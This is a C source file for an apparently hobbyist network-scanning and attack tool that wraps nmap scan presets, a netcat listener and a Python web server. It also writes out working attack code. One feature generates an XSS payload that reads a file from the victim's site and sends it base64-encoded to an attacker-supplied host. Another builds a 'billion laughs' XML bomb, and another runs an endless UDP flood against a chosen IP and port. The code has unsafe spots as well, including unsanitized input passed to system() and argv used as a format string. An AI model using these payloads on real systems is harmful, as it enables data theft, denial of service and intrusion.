// main.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "os.h"
#include "toolset.h"
#include "toolset2.h"

extern Tool2 tools2[];
#define NMAP_INDEX 0    // Index in tools2[] for nmap

//help menu
void help()
{
    //nmap -sL 192.168.1.1/24
    printf("  -Ci show ips connected to a host example 192.168.1.1/24\n");
    //ipconfig,ifconfig ip addr,
    printf("  -sI show ip the machine is connected to\n");
    //default scan:nmap -sC -sV -v <ip addr>
    printf("  -sO our typical scan\n");
    //default scan with given port:nmap -sC -sV -v <ip addr> -p <port number>
    printf("  -sP default scan with given port\n");
    //intense scan plus UDP: nmap -sS -sU -T4 -v --traceroute
    printf("  -iU intense scan plus UDP\n");
    //slow comprenhesive scan:nmap -sS -sU -T4 -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --traceroute
    printf("  -scs slow comprenhesive scan\n");
    //intensive scan, all TCP Ports:nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute
    printf("  -sa intensive scan, all TCP Ports\n");
    //intense scan,no ping: nmap -T4 -A -v -Pn --traceroute
    printf("  -iN intense scan,no ping\n");
    //intense scan:nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute -sC -sV
    printf("  -i intense scan\n");
    //quick scan:nmap -T4 --traceroute
    printf("  -q quick scan\n");
    //default,base nse script,force ipv6:nmap --script=default,safe -sS -sV -O -T4 -v -6 --traceroute
    printf("  -sF default,base nse script,force ipv6:\n");
    //default,base nse script:nmap --script=default,safe -sS -sV -O -T4 -v --traceroute
    printf("  -sdb default,base nse script\n");
    //default aggresive:nmap -A -sS -sV -O -T4 -v --traceroute
    printf("  -sA default aggresive\n");
    //default force ipv6:nmap -sS -sV -O -T4 -v -6 --traceroute
    printf("  -d6 default force ipv6\n");
    //default:mnap -sS -sV -O -T4 -v --traceroute 
    printf("  -d default scan\n");
    //nc -lnvc
    printf("  -l listen to a port\n");
    //python3 -m <port number>
    printf("  -c create simple server with port\n");
    //
    printf("  -xs xss code creation, a few example codes,eg type ./networking_and_scans_automation -xs flag.txt 192.168.1.10:80\n");
    //
    printf("  -xm create xml bomb size given by you\n");
    //
    printf("  -spA spam attack\n");
}
//check tools
// OS Codes: 0 = Linux/Unix, 1 = Windows, 2 = macOS
void install_tool(int os_type, const Tool *tool) {
    int result = 1;

    switch (os_type) {
        case 0:
            result = system(tool->install_cmd_unix);
            break;
        case 1:
            result = system(tool->install_cmd_win);
            break;
        case 2:
            result = system(tool->install_cmd_macos);
            break;
    }

    if (result == 0)
        printf("%s installed.\n", tool->name);
    else
        printf("Failed to install %s.\n", tool->name);
}
//check tools
void check(int os_type)
{
    int status[NUM_TOOLS];
    char choice;

    // Check if tools are installed
    int installed = 0;
    for (int i = 0; i < NUM_TOOLS; i++) {
        status[i] = system(tools[i].check_cmd);
        if (status[i] == 0)
            installed++;
    }

    if (installed == NUM_TOOLS) {
        printf("All tools are already installed.\n");
        return;
    }

    printf("Some tools are missing. Do you want to install them? [y/n]: ");
    while (1) {
        scanf(" %c", &choice);
        if (choice == 'y' || choice == 'Y' || choice == 'n' || choice == 'N') break;
        printf("Answer must be y/n: ");
    }
    if (choice == 'n' || choice == 'N') {
        printf("Aborting installation.\n");
        return;
    }
    // Install missing tools
    for (int i = 0; i < NUM_TOOLS; i++) {
        if (status[i] != 0) {
            install_tool(os_type, &tools[i]);
        }
    } 
}
//sanitize the data from argv
int sanitize_single_arg(char *arg) {
    const char *bad_chars = "&;|`$><\\\"'";
    while (*arg) {
        if (strchr(bad_chars, *arg)) {
            fprintf(stderr, "Invalid character detected in input.\n");
            return 0;
        }
        arg++;
    }

    return 1;  // Valid
}
// sanitize the data for argv[2] and argv[3] (ip and port)
int sanitize_two_args(char *arg1, char *arg2) {
    return sanitize_single_arg(arg1) && sanitize_single_arg(arg2);
}
//nmap without a specific port
void run_nmap(int os_type, const char *params,char *ip) {
    const char *base_cmd = NULL;

    switch (os_type) {
        case 0: base_cmd = tools2[NMAP_INDEX].exec_cmd_unix; break;
        case 1: base_cmd = tools2[NMAP_INDEX].exec_cmd_win; break;
        case 2: base_cmd = tools2[NMAP_INDEX].exec_cmd_macos; break;
    }
    if (!sanitize_single_arg(ip)) {
        fprintf(stderr, "Unsafe IP address provided.\n");
        return;
    }
    char full_command[512];
    //preparing full command
    snprintf(full_command, sizeof(full_command), "%s %s %s", base_cmd, params,ip);
    //executing command
    system(full_command);
}
//nmap with specific port
void run_nmap_port(int os_type, const char *params,char *ip,char *port) {
    const char *base_cmd = NULL;
    switch (os_type) {
        case 0: base_cmd = tools2[NMAP_INDEX].exec_cmd_unix; break;
        case 1: base_cmd = tools2[NMAP_INDEX].exec_cmd_win; break;
        case 2: base_cmd = tools2[NMAP_INDEX].exec_cmd_macos; break;
    }
    if(!sanitize_two_args(ip,port))
    {
        fprintf(stderr, "Unsafe IP address or Port provided.\n");
        return;
    }
    char full_command[512];
    //preparing full command
    snprintf(full_command, sizeof(full_command), "%s %s %s %s", base_cmd, params,port,ip);
    //executing command
    system(full_command);
}
//checking interfaces
void check_interface(int system_type)
{
    int command;
    if(system_type==0){
        command=system("ip addr");
        if(command !=0)
        {
            command=system("ifconfig");
        }
    }
    else if (system_type==1)
    {
        command=system("ipconfig /all");
    }
    else
    {
        command=system("ifconfig");
        //in case ifconfig fails or doesn't exist
        if(command !=0){
            command=system("networksetup -getinfo Wi-Fi");
        }
    }
}
//send udp packets,they don't need ack so it's fast
void send_udp_packet(const char *target_ip, int target_port) {
    int sock;
    struct sockaddr_in dest;
    char message[] = "4baa6b1d158da078f8ca2bfd061fe15f46273587526ec75ba2119918a9ab504e9151650f114a834e1dd2eda3e5924a8813a02f597b7739074645bd9439b10445";

    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Fill in the destination address structure
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = inet_addr(target_ip);
    while(1){
        // Send the packet
        if (sendto(sock, message, strlen(message), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Send failed");
        }
    }
    // Close the socket
    //close(sock);
}

//main
int main(int argc,char* argv[]) {
    int os=0;
    char y[0],c[0],full_command[100];
    char *ip = NULL;
    char *port = NULL;
    char *params = NULL;
    #if IS_LINUX
        os=0;
    #elif IS_WINDOWS
        os=1;
    #elif IS_MACOS
        os=2;
    #elif IS_UNIX
        os=0;
    #endif
    printf("For help type -h\n");
    //checking all the tools
    check(os);
    //if you want to print what argv[1] has:printf("%s\n",argv[1]);
    //compare what 2 pointers has (the content)

    if(argc == 1)
    {
        printf("No arguments given\n");
    }
    else if (argc==2)
    {
        if(strcmp(argv[1], "-h") == 0)
        {
        //calling help() function to print everything the user needs
            help();
        }
        else if(strcmp(argv[1], "-Ci") == 0)
        {
            printf("You must give a range of ips eg 192.168.1.1/24\n");
        }
        else if(strcmp(argv[1], "-sI") == 0)
        {
            check_interface(os);
        }
        else if(strcmp(argv[1], "-sO") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sP") == 0)
        {
            printf("You must give an ip address and port number,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-iU") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-scs") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sa") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-iN") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-i") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-q") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sF") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sdb") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sA") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-d6") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-d") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-w") == 0)
        {
            system("sudo wireshark");
        }
        else if(strcmp(argv[1], "-l") == 0)
        {
            printf("You must give a port number,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-c") == 0)
        {
            printf("You must give a port number,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-xs") == 0)
        {
            printf("You must give the file you want to read from the server and its ip address\n");
        }
        else if(strcmp(argv[1], "-xm") == 0)
        {
            printf("You must give a number,the number tells how big the bomb be\n");
        }
        else if(strcmp(argv[1], "-spA") == 0)
        {
            printf("You must give an ip address and port number,proccess aborts\n");
        }
        else{
            printf("Parametre not listed here\n");
        }
    }
    else if (argc == 3)
    {
        ip=argv[2];
        if(strcmp(argv[1], "-sI") == 0)
        {
            printf("Too many arguments\n");
        }
        else if(strcmp(argv[1], "-sO") == 0)
        {
            params="-sC -sV -v ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-Ci") == 0)
        {
            params="-sL ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-sP") == 0)
        {
            printf("You must give aport number too,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-iU") == 0)
        {
            params="-sS -sU -T4 -v --traceroute ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-scs") == 0)
        {
            params="-sS -sU -T4 -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --traceroute ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-sa") == 0)
        {
            params="nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-iN") == 0)
        {
            params="-T4 -A -v -Pn --traceroute ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-i") == 0)
        {
            params="-T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute -sC -sV ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-q") == 0)
        {
            params="-T4 --traceroute ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-sF") == 0)
        {
            params="--script=default,safe -sS -sV -O -T4 -v -6 --traceroute ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-sdb") == 0)
        {
            params="--script=default,safe -sS -sV -O -T4 -v --tracerout ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-sA") == 0)
        {
            params="-A -sS -sV -O -T4 -v --traceroute ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-d6") == 0)
        {
            params="-sS -sV -O -T4 -v -6 --traceroute ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-d") == 0)
        {
            params="-sS -sV -O -T4 -v --traceroute ";
            run_nmap(os, params, ip);
        }
        else if(strcmp(argv[1], "-w") == 0)
        {
            printf("too many arguments\n");
        }
        else if(strcmp(argv[1], "-l") == 0)
        {
            //storing in a pointer the address of the argv[2]
            port=argv[2];
            strcpy(full_command,"nc -tunlp ");
            strcat (full_command, port);
            //executing the full_comand
            system(full_command);
        }
        else if(strcmp(argv[1], "-c") == 0)
        {
            //storing in a pointer the address of the argv[2]
            port=argv[2];
            strcpy(full_command,"python3 -m http.server ");
            strcat (full_command, port);
            //executing the full_comand
            system(full_command);
        }
        else if(strcmp(argv[1], "-xs") == 0)
        {
            printf("give the ip address too, process aborts\n");
        }
        else if(strcmp(argv[1], "-xm") == 0)
        {
            //converting the argv[2] into an integer
            int x = atoi(argv[2])+1;
            if(x>0)
            {
                FILE *fptr;
                int i;
                // Open a file in writing mode
                fptr = fopen("bomb.txt", "w");
                fprintf(fptr, "<?xml version=\"1.1\"?>\n<!DOCTYPE lolz [\n\t<!ENTITY lol \"lol\">");
                if(x>=2)
                {
                    for(i=2;i<x;i++)
                    {
                        fprintf(fptr,"\n\t<!ENTITY lol");
                        //convert i to char
                        y[0] = i + '0';
                        printf("%c",y[0]);
                        fprintf(fptr,y);
                        fprintf(fptr," ");
                        c[0] = (i-1) +'0';
                        printf("%c\n",c[0]);
                        for(int j=1;j<=10;j++)
                        {
                            if(j==1 || j==10)
                            {
                                fprintf(fptr,"\"");
                            }
                            fprintf(fptr,"&lo");
                            fprintf(fptr,c);
                            fprintf(fptr,";");
                        }
                        fprintf(fptr,">");
                    }
                }
                fprintf(fptr,"\n]>\n<lolz>&lol");
                fprintf(fptr,argv[2]);
                fprintf(fptr,";</lolz>");
                fclose(fptr);
            }
        }
        else if(strcmp(argv[1], "-spA") == 0)
        {
            printf("You must give a port number too,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sE") == 0)
        {
            params="-sn ";
            run_nmap(os, params, ip);
        }
        else
        {
            printf("Parametre not listed here\n");
        }
    }
    else if (argc==4)
    {

        if(strcmp(argv[1], "-sP") == 0)
        {
            port = argv[2];
            ip = argv[3];
            params = "-T4 -A -v -Pn --traceroute -p";
            run_nmap_port(os, params, ip, port);
        }
        else if(strcmp(argv[1], "-xs") == 0)
        {
            FILE *fptr;
            //opening the xss.txt file in write mode
            fptr=fopen("xss.txt","w");
            //we put the data we need
            fprintf(fptr,"Script 1, it's malicious and returnes encrypted data to the attaker\n");
            fprintf(fptr,"It's for educational purposes only, or testing environment\n");
            fprintf(fptr,"<script>\nfetch(\"/");
            fprintf(fptr,argv[2]);
            fprintf(fptr,"\", {method:'GET',mode:'no-cors',credentials:'same-origin'})\n\t.then(response => response.text())\n\t.then(text => { \n\t\tfetch('http://");
            fprintf(fptr,argv[3]);
            fprintf(fptr,"' + btoa(text), {mode:'no-cors'}); \n\t});\n</script>\n\n");
            fprintf(fptr,"Script's to test if there is xss vulnerability\n\n");
            fprintf(fptr,"Script-1 Alert script:\n");
            fprintf(fptr,"<script>alert('XSS-Test-1');</script>\n\n");
            fprintf(fptr,"Script-2 Image Tag XSS\n");
            fprintf(fptr,"<img src=\"x\" onerror=\"alert('XSS-Test-2')\">\n\n");
            fprintf(fptr,"Script-3 SVG XSS\n");
            fprintf(fptr,"<svg onload=\"alert('XSS-Test-3')\"></svg>\n\n");
            fprintf(fptr,"Script-4 JavaScript URI XSS\n");
            fprintf(fptr,"<a href=\"javascript:alert('XSS-Test-4')\">Click Me (Safe Test)</a>\n\n");
            fprintf(fptr,"Script-5 DOM-Based XSS\n");
            fprintf(fptr,"<script>\n");
            fprintf(fptr,"\tconst userInput = decodeURIComponent(window.location.hash.substring(1));\n");
            fprintf(fptr,"\tdocument.write(userInput); // Vulnerable DOM manipulation\n");
            fprintf(fptr,"</script>\n\n more on the next update");
            fclose(fptr);
        }
        else if(strcmp(argv[1], "-spA") == 0)
        {
            const char *target_ip = argv[2];
            //converting argv[3] in an integer,argv[3] is the port
            int target_port = atoi(argv[3]);;
            printf("In order to stop the spam attack type Ctrl+C\n");
            printf("%d",target_port);
            printf("Starting attack on %s",target_ip);
            send_udp_packet(target_ip, target_port);
        }
        else
        {
            fprintf(stderr, "Parametre not listed here\n");
        }
    }
    else
    {
        fprintf(stderr, "Too many argumrnts\n");
    }
    
    return 0;
}
